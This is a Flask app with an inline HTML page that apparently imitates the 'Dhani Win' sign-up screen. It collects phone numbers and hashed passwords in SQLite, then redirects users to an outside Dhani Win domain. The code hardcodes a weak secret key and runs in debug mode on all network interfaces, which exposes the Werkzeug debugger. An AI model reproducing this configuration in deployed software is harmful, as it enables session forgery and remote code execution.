from flask import Flask, render_template_string, request, redirect, flash
from werkzeug.security import generate_password_hash
import sqlite3

app = Flask(__name__)
app.secret_key = "my-secret-key"

DATABASE = "users.db"


# ================= DATABASE =================

def init_db():
    conn = sqlite3.connect(DATABASE)

    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL
        )
    """)

    conn.commit()
    conn.close()


# ================= HTML =================

HTML = """
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width,
               initial-scale=1.0,
               maximum-scale=1.0,
               user-scalable=no">

<title>Dhani Win</title>


<style>

/* ================= BASIC ================= */

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html,
body {
    width: 100%;
    min-height: 100%;
}

body {

    font-family: Arial, sans-serif;

    background:
        radial-gradient(
            circle at top,
            #432366 0%,
            #211036 48%,
            #170b29 100%
        );

    color: white;

    overflow-x: hidden;
}


/* ================= TOP ================= */

.top {

    width: 100%;

    height: 260px;

    position: relative;

    overflow: hidden;

    background:
        linear-gradient(
            rgba(25, 5, 50, 0.35),
            rgba(25, 5, 50, 0.88)
        ),
        url("https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=1200&auto=format&fit=crop");

    background-size: cover;

    background-position: center;
}


/* BACK BUTTON */

.back {

    position: absolute;

    top: 18px;
    left: 18px;

    width: 34px;
    height: 34px;

    display: flex;

    align-items: center;
    justify-content: center;

    font-size: 42px;

    font-weight: 200;

    line-height: 30px;

    color: white;
}


/* LANGUAGE */

.language {

    position: absolute;

    top: 20px;
    right: 18px;

    font-size: 15px;

    white-space: nowrap;
}


/* LOGO */

.logo {

    position: absolute;

    width: 100%;

    top: 92px;

    text-align: center;
}

.logo h1 {

    font-size: 43px;

    line-height: 48px;

    font-style: italic;

    font-weight: 800;

    color: #b65cff;
}

.logo h2 {

    margin-top: -2px;

    font-size: 35px;

    line-height: 38px;

    color: #ff9d16;

    font-weight: 800;
}


/* ================= MAIN ================= */

.container {

    width: calc(100% - 32px);

    max-width: 430px;

    margin: 10px auto 30px;
}


/* ================= MESSAGE ================= */

.message {

    width: 100%;

    margin-bottom: 10px;

    padding: 10px 12px;

    text-align: center;

    border-radius: 10px;

    background: rgba(255,255,255,0.08);

    color: #ffd75a;

    font-size: 14px;
}


/* ================= INPUT BOX ================= */

.input-box {

    width: 100%;

    height: 58px;

    margin-bottom: 13px;

    display: flex;

    align-items: center;

    padding: 0 13px;

    border-radius: 14px;

    border: 1px solid rgba(
        190,
        145,
        230,
        0.42
    );

    background:
        rgba(43, 24, 70, 0.94);

    box-shadow:
        inset 0 0 12px
        rgba(0,0,0,0.10);
}


/* INPUT ICON */

.icon {

    width: 34px;

    min-width: 34px;

    display: flex;

    justify-content: center;

    align-items: center;

    font-size: 20px;

    color: #bea1dd;
}


/* COUNTRY CODE */

.country {

    margin-right: 9px;

    font-size: 19px;

    font-weight: 600;

    color: #ffffff;
}


/* INPUT */

input {

    width: 100%;

    min-width: 0;

    height: 100%;

    padding: 0;

    border: none;

    outline: none;

    background: transparent;

    color: white;

    font-size: 16px;

    font-family: Arial, sans-serif;
}


input::placeholder {

    color: #9d88b7;

    opacity: 1;
}


/* ================= EYE ICON ================= */

/*
   Emoji ഉപയോഗിക്കുന്നില്ല.
   ഇത് CSS ഉപയോഗിച്ചുള്ള proper eye icon ആണ്.
*/

.eye-button {

    width: 30px;

    min-width: 30px;

    height: 30px;

    margin-left: 6px;

    position: relative;

    display: flex;

    align-items: center;

    justify-content: center;

    cursor: pointer;
}


/* EYE SHAPE */

.eye-shape {

    width: 21px;

    height: 13px;

    border: 2px solid #bda5d6;

    border-radius: 80% 20%;

    transform: rotate(45deg);

    position: relative;
}


/* EYE CENTER */

.eye-shape::after {

    content: "";

    position: absolute;

    width: 5px;

    height: 5px;

    background: #bda5d6;

    border-radius: 50%;

    top: 2px;

    left: 6px;
}


/* CLOSED EYE */

.eye-button.closed
.eye-shape {

    border-color: #88729e;

    opacity: 0.85;
}


/* STRIKE THROUGH CLOSED EYE */

.eye-button.closed::after {

    content: "";

    position: absolute;

    width: 25px;

    height: 2px;

    background: #bda5d6;

    transform: rotate(-45deg);
}


/* ================= REGISTER ================= */

.register {

    width: 100%;

    height: 58px;

    margin: 20px auto 17px;

    display: block;

    border: none;

    border-radius: 30px;

    background:
        linear-gradient(
            180deg,
            #ffe66b 0%,
            #ffc21c 45%,
            #efa800 100%
        );

    color: #28132f;

    font-size: 20px;

    font-weight: 500;

    cursor: pointer;

    box-shadow:
        0 5px 13px
        rgba(0,0,0,0.28);
}


.register:active {

    transform: scale(0.985);
}


/* ================= LOGIN ================= */

.login {

    width: 100%;

    height: 58px;

    display: flex;

    justify-content: center;

    align-items: center;

    border: 1.5px solid #d4a63b;

    border-radius: 30px;

    color: #e8b83f;

    text-decoration: none;

    font-size: 19px;

    font-weight: 500;
}


/* ================= SMALL MOBILE ================= */

@media (max-width: 360px) {

    .top {
        height: 235px;
    }

    .logo {
        top: 82px;
    }

    .logo h1 {
        font-size: 38px;
    }

    .logo h2 {
        font-size: 31px;
    }

    .container {
        width: calc(100% - 24px);
    }

    .input-box {
        height: 54px;
        margin-bottom: 11px;
        border-radius: 13px;
    }

    input {
        font-size: 14px;
    }

    .country {
        font-size: 17px;
    }

    .register,
    .login {
        height: 54px;
    }

}


/* ================= TABLET / LAPTOP ================= */

@media (min-width: 600px) {

    .top {

        height: 330px;
    }

    .logo {

        top: 115px;
    }

    .logo h1 {

        font-size: 52px;
    }

    .logo h2 {

        font-size: 43px;
    }

    .container {

        max-width: 500px;

        margin-top: 18px;
    }

    .input-box {

        height: 62px;
    }

    .register,
    .login {

        height: 62px;
    }

}

</style>

</head>


<body>


<!-- ================= HEADER ================= -->

<div class="top">

    <div class="back">
        ‹
    </div>


    <div class="language">
        🎧 &nbsp; 🇬🇧 EN
    </div>


    <div class="logo">

        <h1>Dhani</h1>

        <h2>Win</h2>

    </div>

</div>



<!-- ================= FORM ================= -->

<div class="container">


{% with messages = get_flashed_messages() %}

    {% if messages %}

        {% for message in messages %}

            <div class="message">
                {{ message }}
            </div>

        {% endfor %}

    {% endif %}

{% endwith %}



<form method="POST"
      action="/register">


<!-- PHONE -->

<div class="input-box">

    <div class="icon">
        📱
    </div>

    <div class="country">
        +91
    </div>

    <input
        type="tel"
        name="phone"
        placeholder="Enter your phone number"
        maxlength="10"
        inputmode="numeric"
        required>

</div>



<!-- PASSWORD -->

<div class="input-box">

    <div class="icon">
        🔒
    </div>

    <input
        type="password"
        id="password"
        name="password"
        placeholder="Password: 8-15 letters and numbers"
        minlength="8"
        maxlength="15"
        required>


    <div
        class="eye-button"
        id="passwordEye"
        onclick="togglePassword(
            'password',
            'passwordEye'
        )">

        <div class="eye-shape"></div>

    </div>

</div>



<!-- CONFIRM PASSWORD -->

<div class="input-box">

    <div class="icon">
        🔒
    </div>

    <input
        type="password"
        id="confirmPassword"
        name="confirm_password"
        placeholder="Enter the password again"
        minlength="8"
        maxlength="15"
        required>


    <div
        class="eye-button"
        id="confirmEye"
        onclick="togglePassword(
            'confirmPassword',
            'confirmEye'
        )">

        <div class="eye-shape"></div>

    </div>

</div>



<!-- REGISTER -->

<button
    type="submit"
    class="register">

    Register

</button>


</form>



<!-- PASSWORD LOGIN -->

<a
    href="#"
    class="login">

    Password Login

</a>


</div>



<script>

/* ================= PASSWORD SHOW/HIDE ================= */

function togglePassword(inputId, eyeId) {

    const input =
        document.getElementById(inputId);

    const eye =
        document.getElementById(eyeId);


    if (input.type === "password") {

        input.type = "text";

        eye.classList.remove("closed");

    }

    else {

        input.type = "password";

        eye.classList.add("closed");

    }

}

</script>


</body>

</html>
"""


# ================= HOME =================

@app.route("/")
def home():

    return render_template_string(HTML)


# ================= REGISTER =================

@app.route("/register", methods=["POST"])
def register():

    phone = request.form.get(
        "phone",
        ""
    ).strip()

    password = request.form.get(
        "password",
        ""
    )

    confirm_password = request.form.get(
        "confirm_password",
        ""
    )


    # PHONE CHECK

    if not phone.isdigit() or len(phone) != 10:

        flash(
            "Please enter a valid 10-digit phone number."
        )

        return redirect("/")


    # PASSWORD LENGTH

    if len(password) < 8 or len(password) > 15:

        flash(
            "Password must be 8-15 characters."
        )

        return redirect("/")


    # PASSWORD MATCH

    if password != confirm_password:

        flash(
            "Passwords do not match."
        )

        return redirect("/")


    # HASH PASSWORD

    hashed_password = generate_password_hash(
        password
    )


    # SAVE USER

    try:

        conn = sqlite3.connect(DATABASE)

        conn.execute(
            """
            INSERT INTO users
            (phone, password)
            VALUES (?, ?)
            """,
            (
                phone,
                hashed_password
            )
        )

        conn.commit()

        conn.close()


    except sqlite3.IntegrityError:

        flash(
            "This phone number is already registered."
        )

        return redirect("/")


    return redirect("https://dhaniwin4.com/")


# ================= SUCCESS =================

@app.route("/success")
def success():

    return """
<!DOCTYPE html>

<html>

<head>

<meta name="viewport"
      content="width=device-width,
               initial-scale=1.0">

<title>Success</title>

<style>

* {
    box-sizing: border-box;
}

body {

    margin: 0;

    min-height: 100vh;

    display: flex;

    justify-content: center;

    align-items: center;

    padding: 20px;

    background: #180b2d;

    color: white;

    font-family: Arial;
}

.box {

    width: 100%;

    max-width: 380px;

    padding: 30px 20px;

    text-align: center;

    background: #2b1746;

    border-radius: 22px;
}

h1 {

    color: #ffd044;

    font-size: 25px;
}

p {

    font-size: 16px;

    color: #d0c2dc;
}

a {

    display: inline-flex;

    justify-content: center;

    align-items: center;

    margin-top: 18px;

    width: 100%;

    height: 52px;

    background: #f4b400;

    border-radius: 28px;

    color: #24122e;

    text-decoration: none;

    font-size: 18px;
}

</style>

</head>

<body>

<div class="box">

    <h1>
        ✓ Registration Successful
    </h1>

    <p>
        Your account has been registered successfully.
    </p>

    <a href="/">
        Back
    </a>

</div>

</body>

</html>
"""


# ================= START SERVER =================

# Database initialize ചെയ്യുക
init_db()


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000,
        debug=True
    )
